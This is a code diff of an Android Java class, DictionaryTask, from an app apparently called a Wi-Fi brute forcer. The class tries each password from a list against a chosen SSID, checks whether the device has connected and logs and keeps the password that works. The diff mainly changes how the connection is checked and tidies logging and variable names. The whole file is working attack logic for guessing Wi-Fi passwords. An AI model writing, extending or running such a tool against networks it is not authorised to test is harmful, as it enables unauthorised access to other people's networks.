@@ -1,8 +1,9 @@
 package com.nguyen.wifibruteforce;
 
-import android.annotation.SuppressLint;
 import android.app.Activity;
-import android.app.FragmentManager;
+import android.content.Context;
+import android.net.ConnectivityManager;
+import android.net.NetworkInfo;
 import android.net.wifi.WifiInfo;
 import android.net.wifi.WifiManager;
 import android.os.AsyncTask;
@@ -40,20 +41,18 @@ public class DictionaryTask extends AsyncTask<String, Integer, Integer> {
 
     }
 
+    // strings[0]: ssid
     @Override
     protected Integer doInBackground(String... strings) {
-//        ArrayList test
-//        String[] test = {"88888888", "123456789", "222222", "444444444", "12345679", "deophaihoi", "thecoffeehouse"};
-//        String testPass;
-        int count = 1;
-        for (String testPass: getArrPass()) {
-//            testPass = test[i];
+        int count = 1;  //onProgressUpdate
+        for (String testPass : getArrPass()) {
             Utils.finallyConnect(testPass, strings[0], activity);
             Log.d("running", testPass);
-            publishProgress(count);
+
+            publishProgress(count);     //onProgressUpdate
 
             if (isCancelled()) {
-                Log.d("running", "isCancelled");
+                Log.d("running", "isCancelled_DIC");
                 break;
             }
             try {
@@ -62,17 +61,18 @@ public class DictionaryTask extends AsyncTask<String, Integer, Integer> {
                 e.printStackTrace();
             }
 
-            WifiManager wifi = (WifiManager) activity.getApplicationContext().getSystemService(WIFI_SERVICE);
-            WifiInfo wifiInfo = wifi.getConnectionInfo();
+            ConnectivityManager cm = (ConnectivityManager) activity.getSystemService(Context.CONNECTIVITY_SERVICE);
+            assert cm != null;
+            NetworkInfo ni = cm.getActiveNetworkInfo();
             if (Utils.isConnectAccessPoint(activity.getApplicationContext())
-                    && Utils.convertSSID(wifiInfo.getSSID()).equals(strings[0])) {
-                Log.d("running", Utils.convertSSID(wifiInfo.getSSID()) + "/" + strings[0] + "/pass: " + testPass);
+                    && Utils.convertSSID(ni.getExtraInfo()).equals(strings[0])) {
+                Log.d("running", Utils.convertSSID(ni.getExtraInfo()) + "/" + strings[0] + "/pass: " + testPass);
                 foundPass = testPass;
-                Log.d("running", "pass for Toast: " + foundPass);
+//                Log.d("running", "pass for Toast: " + foundPass);
                 break;
             }
 
-            count+=1;
+            count += 1;
         }
 
         return null;
@@ -81,8 +81,8 @@ public class DictionaryTask extends AsyncTask<String, Integer, Integer> {
     @Override
     protected void onProgressUpdate(Integer... values) {
         super.onProgressUpdate(values);
-        TextView txtPassCout = activity.findViewById(R.id.txtPassCount);
-        txtPassCout.setText(values[0] + "");
+        TextView txtPassCount = activity.findViewById(R.id.txtPassCount);
+        txtPassCount.setText(values[0] + "");
     }
 
     @Override
